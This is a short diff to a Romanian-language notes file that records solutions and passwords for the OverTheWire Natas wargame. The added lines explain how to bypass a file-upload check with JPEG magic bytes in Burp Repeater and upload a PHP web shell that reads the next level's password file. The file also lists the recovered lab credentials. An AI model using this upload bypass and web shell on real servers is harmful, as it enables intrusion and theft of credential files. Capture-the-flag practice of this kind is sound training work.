@@ -88,4 +88,10 @@ PAROLA: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 
 LEVEL_12: http://natas13.natas.labs.overthewire.org natas13 lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 
+Cu ajutorul Repeater-ului folosim doar primii octeti care identifica fisierul ca JPEG, apoi folosim <?php system("cat /etc/natas_webpass/natas13"); ?>
+PAROLA: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+LEVEL_13: http://natas14.natas.labs.overthewire.org natas14 qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+
 
